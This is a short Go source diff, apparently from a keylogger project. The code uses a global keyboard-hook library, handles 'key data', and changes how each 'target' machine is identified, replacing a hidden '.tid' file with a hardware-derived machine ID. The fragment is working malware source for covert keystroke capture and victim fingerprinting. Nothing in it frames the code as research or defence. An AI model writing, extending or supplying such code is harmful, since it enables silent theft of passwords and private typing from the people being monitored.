@@ -13,6 +13,7 @@ import (
 	"strings"
 	"time"
 
+	"github.com/denisbrodbeck/machineid"
 	hook "github.com/robotn/gohook"
 )
 
@@ -36,34 +37,14 @@ type ResponseStruct struct {
 	ID string `json:"id"`
 }
 
-// Reads and returns target ID from `.tid` (if it exists.)
-// Returns an empty string otherwise.
+// Returns machine's ID as returned by `machineid`
 func getTargetID() string {
-	userHome, err := os.UserHomeDir()
+	targetID, err := machineid.ID()
 	if err != nil {
 		log.Panicf("Error: %s", err.Error())
 	}
 
-	confDir := filepath.Join(userHome, APPLICATION_DIRECTORY)
-	createHiddenDirectory(confDir)
-
-	// path to our target file
-	confFile := filepath.Join(confDir, ".tid")
-
-	// read file into `targetID`
-	targetID, err := os.ReadFile(confFile)
-	if os.IsNotExist(err) {
-		// the file does not exist
-		// return an empty string
-		return ""
-	}
-	if err != nil && !os.IsNotExist(err) {
-		// the file exists but we encountered an error
-		// panic
-		log.Panicf("Error: %s", err.Error())
-	}
-
-	return string(targetID)
+	return targetID
 }
 
 // Pushes key data to `localStruct.Contents`
